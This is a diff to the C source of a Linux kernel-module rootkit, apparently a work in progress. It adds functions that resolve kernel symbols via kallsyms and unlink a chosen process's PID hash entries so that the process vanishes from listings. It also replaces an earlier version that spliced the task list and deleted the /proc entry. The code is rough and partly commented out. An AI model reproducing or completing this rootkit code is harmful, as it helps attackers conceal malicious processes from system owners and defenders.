@@ -48,21 +48,74 @@ int hide_pid(pid_t pid);
 int unhide_pid(pid_t pid);
 void pinfo(const char *fmt, ...);
 void vpinfo(const char *fmt, va_list args);
+int *nr_threads = NULL;
+unsigned long process_counts = 0;
+
+void attach_pid(struct task_struct *task, enum pid_type type)
+{
+    struct pid_link *link = &task->pids[type];
+    hlist_add_head_rcu(&link->node, &link->pid->tasks[type]);
+}
+
+static void __change_pid(struct task_struct *task, enum pid_type type,
+            struct pid *new)
+{
+    struct pid_link *link;
+    struct pid *pid;
+    //int tmp;
+
+    link = &task->pids[type];
+    pid = link->pid;
+
+    hlist_del_rcu(&link->node);
+/*
+	link->pid = new;
+
+    for (tmp = PIDTYPE_MAX; --tmp >= 0; )
+        if (!hlist_empty(&pid->tasks[tmp]))
+            return;
+
+    free_pid(pid);
+*/
+}
+
+static void __unhash_process(struct task_struct *p, bool group_dead)
+{
+    *nr_threads -= 1;
+	__change_pid(p, PIDTYPE_PID, NULL);
+/*
+    if (group_dead) {
+		__change_pid(p, PIDTYPE_PGID, NULL);
+		__change_pid(p, PIDTYPE_SID, NULL);
+
+        list_del_rcu(&p->tasks);
+        list_del_init(&p->sibling);
+        __this_cpu_dec(process_counts);
+    }
+    list_del_rcu(&p->thread_group);
+    list_del_rcu(&p->thread_node);
+*/
+}
+
 static int __init init_rootkit(void)
 {
     //pinfo("Hello world\n");
 
 	pid_hash = (struct hlist_head *) *((struct hlist_head **) kallsyms_lookup_name("pid_hash"));
 	pidhash_shift = (unsigned int) *((unsigned int *) kallsyms_lookup_name("pidhash_shift"));
+	nr_threads = (int *) kallsyms_lookup_name("nr_threads");
+	process_counts = (unsigned long) kallsyms_lookup_name("process_counts");
 
+	//pinfo("%p unhash_process", __unhash_process);
 	if (pid_hash == NULL || pidhash_shift == 0) {
 		pinfo("ERROR: pid_hash = %p, pidhash_shift = %d", pid_hash, pidhash_shift);
 		return -1;
 	}
 
-	pinfo("pid_hash = %p, pidhash_shift = %d\n", pid_hash, pidhash_shift);
+	pinfo("pid_hash = %p, pidhash_shift = %d, nr_threads = %d, process_counts = %d\n", pid_hash, pidhash_shift, nr_threads, process_counts);
 
-	hide_pid(10);
+	hide_pid(9311);
+	//unhide_pid(6661);
 
 	return 0;
 }
@@ -70,6 +123,90 @@ static int __init init_rootkit(void)
 static void __exit cleanup_rootkit(void)
 {
     //pinfo("Goodbye, ARP rootkit\n");
+}
+
+int hide_pid(pid_t nr) {
+	//struct pid_namespace *ns = task_active_pid_ns(current);
+	//struct upid *pnr;
+	//printk("ns %p\n", ns);
+	//printk("nr %d\n", nr);
+	//struct hlist_head *head;
+	//struct hlist_node *node;
+	struct pid *pid;
+	struct task_struct *task;
+	//struct list_head *task_next, *task_prev;
+	//char path_name[50];
+	//struct path path;
+
+	//head = &pid_hash[pid_hashfn(nr, ns)];
+	//node = hlist_first_rcu(head);
+	//pnr = hlist_entry_safe(rcu_dereference_raw(node), typeof(*(pnr)), pid_chain);
+	//if (pnr) {
+		//printk("%d\n", pnr->nr);
+		//if (pnr->nr == nr && pnr->ns == ns) {
+		pid = find_vpid(nr);
+		if (pid) {
+			pinfo("found pid %d", nr);
+			//pid = container_of(pnr, struct pid, numbers[ns->level]);
+			task = get_pid_task(pid, PIDTYPE_PID);
+			if (task) {
+				//printk("task = %p\n", task);
+//				task_prev = task->tasks.next->prev;
+//				task_next = task->tasks.prev->next;
+//				task->tasks.next->prev = task->tasks.prev;
+//				task->tasks.prev->next = task->tasks.next;
+				__unhash_process(task, false);
+				attach_pid(task, PIDTYPE_PID);
+//				hlist_del_rcu(node);
+//				pid_hash[pid_hashfn(nr, ns)].first = NULL;
+				//snprintf(path_name, sizeof(path_name), "/proc/%d", nr);
+				//kern_path(path_name, LOOKUP_FOLLOW, &path);
+				//d_delete(path.dentry);
+				// unhide
+				//d_rehash(path.dentry);
+				//hlist_add_head_rcu(node, &pid_hash[pid_hashfn(nr, ns)]);
+				//task->tasks.next->prev = task_prev;
+				//task->tasks.prev->next = task_next;
+
+				pinfo("find_vpid %p", find_vpid(nr));
+				
+				pinfo("Ok");
+		
+				return 0;
+			} else {
+				pinfo("task_struct for PID %d not found", nr);
+			}
+		} else {
+			pinfo("PID not found.");
+		}
+//	} else {
+//		pinfo("Unknown error 1.");
+//	}
+
+	return -1;
+}
+
+int unhide_pid(pid_t nr) {
+	struct pid *pid;
+	struct task_struct *task;
+
+	pid = find_vpid(nr);
+	if (pid) {
+		task = get_pid_task(pid, PIDTYPE_PID);
+		if (task) {
+			attach_pid(task, PIDTYPE_PID);
+
+			pinfo("Ok");
+
+			return 0;
+		} else {
+			pinfo("task not found");
+		}
+	} else {
+		pinfo("pid not found");
+	}
+
+	return -1;
 }
 
 // from https://github.com/bashrc/LKMPG/blob/master/4.14.8/examples/print_string.c
@@ -164,62 +301,6 @@ void vpinfo(const char *fmt, va_list args) {
         (ttyops->write) (my_tty, "\015\012", 2);
 #endif
     }
-}
-
-int hide_pid(pid_t nr) {
-	struct pid_namespace *ns = task_active_pid_ns(current);
-	struct upid *pnr;
-	//printk("ns %p\n", ns);
-	//printk("nr %d\n", nr);
-	struct hlist_head *head;
-	struct hlist_node *node;
-	head = &pid_hash[pid_hashfn(nr, ns)];
-	node = hlist_first_rcu(head);
-	pnr = hlist_entry_safe(rcu_dereference_raw(node), typeof(*(pnr)), pid_chain);
-	if (pnr) {
-		//printk("%d\n", pnr->nr);
-		if (pnr->nr == nr && pnr->ns == ns) {
-			pinfo("found pid %d", nr);
-			struct pid *pid = container_of(pnr, struct pid, numbers[ns->level]);
-			struct task_struct *task = get_pid_task(pid, PIDTYPE_PID);
-			if (task != NULL) {
-				//printk("task = %p\n", task);
-				struct list_head *task_next, *task_prev;
-				task_prev = task->tasks.next->prev;
-				task_next = task->tasks.prev->next;
-				task->tasks.next->prev = task->tasks.prev;
-				task->tasks.prev->next = task->tasks.next;
-				hlist_del_rcu(node);
-				char path_name[50];
-				snprintf(path_name, sizeof(path_name), "/proc/%d", nr);
-				struct path path;
-				kern_path(path_name, LOOKUP_FOLLOW, &path);
-				d_delete(path.dentry);
-				d_rehash(path.dentry);
-				hlist_add_head_rcu(node, &pid_hash[pid_hashfn(nr, ns)]);
-				task->tasks.next->prev = task_prev;
-				task->tasks.prev->next = task_next;
-
-				pinfo("find_vpid %p", find_vpid(nr));
-				
-				pinfo("Ok");
-		
-				return 0;
-			} else {
-				pinfo("task_struct for PID %d not found", nr);
-			}
-		} else {
-			pinfo("Unknown error 1");
-		}
-	} else {
-		pinfo("PID not found.");
-	}
-
-	return -1;
-}
-
-int unhide_pid(pid_t pid) {
-	
 }
 
 module_init(init_rootkit);
